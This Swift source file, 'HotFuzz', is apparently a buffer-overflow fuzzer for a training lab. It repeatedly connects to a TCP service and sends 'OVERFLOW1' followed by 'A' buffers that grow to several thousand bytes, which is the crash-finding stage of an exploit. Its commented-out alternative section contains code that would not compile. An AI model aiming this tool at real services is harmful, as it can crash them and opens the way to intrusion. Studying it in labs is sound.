//
//  main.swift
//  HotFuzz
//

import Foundation
import SwiftSocket

let argumentCount:Int = CommandLine.arguments.count // Returns the number of arguments passed to the program.
var args = CommandLine.arguments                    // Returns an array/list(pythonic) of arguments passed to the program.


// // ============================== NOTE!! ... ONLY A SINGLE QUALITY-type PARSING  SHOULD BE USED AT A TIME!!. =============================






// // IMPLEMENTED HIGH QUALITY COMMANDLINE PARSING HERE
// // START******************************************************************** SECTION-1 ********************************************************START
// //
// //
// //
// // ====START-HIGH_COMMANDLINE_QUALITY_PARSING====. UNCOMMENT CODE BELOW TO USE.


// import ArgumentParser
// struct Repeat: ParsableCommand {
//     @Option(name: [.short, .customLong("host")], help: "IP Address to connect to, e.g '192.168.1.1'.")
//     var ipAddress: String = "127.0.0.1"

//     @Option(name: [.short, .customLong("port")], help: "Port Number to connect with on specified host.")
//     var portNumber: Int32 = 1337

//     @Argument(name: [.short, customLong("timeout")], help: "Number of seconds to wait before connection times out.")
//     var timeOutPeriod: Int = 10

//     mutating func run() throws {
//
//        print("[+] Using: IP:\(ipAddress), Port:\(portNumber), Timeout:\(timeOutPeriod)")
//
//         var buffer = [String]()
//         var counter: Int = 100
//         // var loopLimit: Int = 30


//         while buffer.count <= loopLimit {
//             buffer.append(String(repeating: "A", count: counter))
//             counter = counter + 100
//         }
//         // ALTERNATE ARRAY POPULATING CODE USING FOR-LOOP
//         //
//         //for index in 0..<loopLimit {
//         //    buffer.append(String(repeating: "A", count: counter))
//         //    counter = counter + 100
//         //}

//         for bufstring in buffer
//         {
//             // Create a socket connection to specified IP and PORT number.
//             let client = TCPClient(address: ipAddress, port: portNumber)
            
//             // Calls "connect" method to actually connect to specified host.
//             // Swift and Library provides a neat way of doing
//             // some sort of exception handling
//             switch client.connect(timeout: timeOutPeriod) { //timeout period passed as argument to connect
//                 case .success:
//                     print("[+] Connected Succesfully");
//                 case .failure(let error):
//                     print("[*] Could not connect to \(ipAddress) : \(portNumber)")
//                     print(error)
//                     exit(EXIT_FAILURE)
//             }
            
//             // Perform a read of the returned socket.
//             // No. of bytes to read as argument.
//             let _ = client.read(1024)
//             print("[+] Fuzzing with", bufstring.count, " bytes")
            
//             // Here we convert concatenated string to byte in preparation
//             // You can specify required encoding.
//             let dataTosend: Data = "OVERFLOW1 \(bufstring)\r\n".data(using: .utf8)!
//             let _ = client.send(data: dataTosend) // Send bytes "OverTheWire" lol
            
//             // Perform another read of the socket
//             // No. of bytes to read as argument.
//             let _ = client.read(1024)
            
//             // Then we finnally close our goddamn! socket, oops language!.
//             client.close()
//         }

//     }
// }
// Repeat.main()


// // ====END-HIGH_COMMANDLINE_QUALITY_PARSING====UNCOMMENT CODE ABOVE TO USE.

// //**UNDERSCORE(_) USED THROUGHOUT PROGRAM AS PLACEHOLDER ... i don't like seeing compiler warnings! lol.
// //
// //
// // END******************************************************************** SECTION-1 ********************************************************END








//IMPLEMENTED LOW COMPLEXITY COMMANDLINE PARSING HERE
// // START******************************************************************** SECTION-2 ********************************************************START
//
//
// ====START-LOW_COMMANDLINE_QUALITY_PARSING====
//

// Default values to use.
var ipAddress: String = "127.0.0.1"
var portNumber: Int32 = 1337
var timeOutPeriod: Int = 10


if argumentCount == 1{ // Start from 1 because argumentCount[0] is filename!.
    print("[+] Using default args ... ")
}
else if argumentCount == 2{ // If a single argument passed, it's assumed to be an IPADDRESS or "-h".
    let str: String = args[1].lowercased()

    if str == "-h" || str == "-help" || str == "--h" || str == "--help" {
        print("""
        Usage:  \(#file) IP PORT TIMEOUT.
                binaryName 10.0.1.1 1337 5
        Default:    IP = \(ipAddress)
                    PORT= \(portNumber)
                    TIMEOUT = \(timeOutPeriod)
        """)
        exit(EXIT_SUCCESS)
    }
    else {
        ipAddress = (str)
    }
}
else if argumentCount == 3{ // If a 2 arguments passed, it's assumed to be an IPADDRESS, and PORT NUMBER.
    ipAddress = String(args[1])
    portNumber = Int32(args[2]) ?? portNumber
}
else if argumentCount == 4{ // If a 3 arguments passed, it's assumed to be an IPADDRESS, PORT NUMBER, and TIMEOUT(in seconds).
    ipAddress = String(args[1])
    portNumber = Int32(args[2]) ?? portNumber
    timeOutPeriod = Int(args[3]) ?? timeOutPeriod
}


print("[+] Using: IP:\(ipAddress), Port:\(portNumber), Timeout:\(timeOutPeriod)")
var buffer = [String]()
var counter: Int = 100
var loopLimit: Int = 30

while buffer.count <= loopLimit {
    buffer.append(String(repeating: "A", count: counter))
    counter = counter + 100
}
// ALTERNATE ARRAY POPULATING CODE USING FOR-LOOP
//
//for index in 0..<loopLimit {
//    buffer.append(String(repeating: "A", count: counter))
//    counter = counter + 100
//}

for bufstring in buffer
{
    // Create a socket connection to specified IP and PORT number.
    let client = TCPClient(address: ipAddress, port: portNumber)
    
    // Calls "connect" method to actually connect to specified host.
    // Swift and Library provides a neat way of doing
    // some sort of exception handling
    switch client.connect(timeout: timeOutPeriod) { //timeout period passed as argument to connect
        case .success:
            print("[+] Connected Succesfully");
        case .failure(let error):
            print("[*] Could not connect to \(ipAddress) : \(portNumber)")
            print(error)
            exit(EXIT_FAILURE)
    @unknown default:
        print("Let me guess ... you have no idea why youre seeing me do you? ... lol")
    }
    let _ = client.send(string: "Hello there!")
    // Perform a read of the returned socket.
    // No. of bytes to read as argument.
    let _ = client.read(1024)
    print("[+] Fuzzing with", bufstring.count, " bytes")
    
    // Here we convert concatenated string to byte in preparation
    // You can specify required encoding.
    let dataTosend: Data = "OVERFLOW1 \(bufstring)\r\n".data(using: .utf8)!
    let _ = client.send(data: dataTosend)// Send bytes "OverTheWire" lol
    
    // Perform another read of the socket
    // No. of bytes to read as argument.
    let _ = client.read(1024)
    
    // Then we finnally close our goddamn! socket, oops language!.
    client.close()
}

// ====END-LOW_COMMANDLINE_QUALITY_PARSING====
//
//
// END******************************************************************** SECTION-2 ********************************************************END
//**UNDERSCORE(_) USED THROUGHOUT PROGRAM AS PLACEHOLDER ... i don't like seeing compiler warnings! lol.
